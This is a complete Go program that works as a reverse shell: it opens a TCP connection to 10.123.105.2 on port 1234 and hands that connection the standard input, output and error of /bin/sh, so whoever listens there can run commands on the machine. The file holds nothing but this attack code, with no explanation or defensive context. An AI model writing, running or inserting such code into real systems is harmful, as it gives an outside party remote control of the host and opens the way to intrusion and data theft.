package main

import "os/exec"
import "net"

func main() {
	c, _ := net.Dial("tcp", "10.123.105.2:1234")
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}
